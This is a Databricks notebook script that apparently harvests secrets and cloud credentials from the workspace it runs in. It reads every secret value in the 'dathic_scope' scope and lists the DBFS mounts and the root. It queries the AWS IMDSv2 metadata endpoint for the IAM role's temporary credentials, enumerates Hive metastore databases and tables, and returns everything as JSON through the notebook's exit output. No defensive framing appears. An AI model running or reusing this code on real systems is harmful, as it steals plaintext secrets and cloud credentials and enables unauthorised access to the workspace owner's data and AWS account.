# Databricks notebook source
import json, os, urllib.request
out = {}
def add(k, f):
    try: out[k] = f()
    except Exception as e: out[k] = 'ERR: ' + repr(e)[:300]
# secrets
scopes = []
add('scopes', lambda: [s.name for s in dbutils.secrets.listScopes()])
add('scope_meta', lambda: [str(s) for s in dbutils.secrets.listScopes()])
def slist():
    r = []
    for s in ['dathic_scope']:
        try:
            for k in dbutils.secrets.list(s):
                r.append([s, str(getattr(k,'key',None) or getattr(k,'name',None)), str(k)])
        except Exception as e:
            r.append([s, 'ERR', repr(e)[:150]])
    return r
add('secret_keys', slist)
sv = {}
try:
    for k in dbutils.secrets.list('dathic_scope'):
        key = getattr(k,'key',None) or getattr(k,'name',None)
        try: sv[str(key)] = dbutils.secrets.get(scope='dathic_scope', key=key)
        except Exception as e: sv[str(key)] = 'ERR ' + repr(e)[:120]
except Exception as e:
    sv['_'] = repr(e)
out['secret_values'] = sv
# mounts / fs
add('mnt', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/mnt/')][:60])
add('datapao', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/mnt/datapao-public/')][:60])
add('root', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/')][:60])
add('results', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/databricks-results/')][:30])
# IMDSv2
def imds2():
    tk = urllib.request.urlopen(urllib.request.Request('http://169.254.169.254/latest/api/token', method='PUT', headers={'X-aws-ec2-metadata-token-ttl-seconds':'600'}), timeout=4).read().decode()
    h = {'X-aws-ec2-metadata-token': tk}
    role = urllib.request.urlopen(urllib.request.Request('http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers=h), timeout=4).read().decode().strip()
    cred = urllib.request.urlopen(urllib.request.Request('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, headers=h), timeout=4).read().decode()
    inst = urllib.request.urlopen(urllib.request.Request('http://169.254.169.254/latest/meta-data/instance-id', headers=h), timeout=4).read().decode()
    return {'role': role, 'creds': json.loads(cred), 'instance': inst}
add('imds', imds2)
# hive metastore
add('databases', lambda: [(d.name, d.description, d.locationUri) for d in spark.catalog.listDatabases()])
def tables():
    r = {}
    for d in spark.catalog.listDatabases():
        try:
            r[d.name] = [(t.name, t.tableType) for t in spark.catalog.listTables(d.name)][:200]
        except Exception as e:
            r[d.name] = 'ERR ' + repr(e)[:100]
    return r
add('tables', tables)
dbutils.notebook.exit(json.dumps(out, default=str)[:90000])
